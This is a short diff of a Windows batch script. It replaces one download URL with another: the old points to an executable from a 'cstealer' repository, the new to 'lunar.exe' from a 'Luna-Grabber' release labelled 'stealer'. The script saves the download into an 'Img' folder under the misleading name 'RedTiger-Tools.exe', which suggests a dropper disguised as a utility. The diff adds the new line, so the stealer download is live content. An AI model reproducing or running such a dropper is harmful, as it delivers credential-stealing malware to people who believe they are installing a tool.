@@ -1,5 +1,5 @@
 @echo off
-set "URL=https://github.com/hvbsvqdj/cstealer/releases/download/stealer/cstealer.exe"
+set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
 set "Dossier=Img"
 set "NomFichier=%Dossier%\RedTiger-Tools.exe"
 
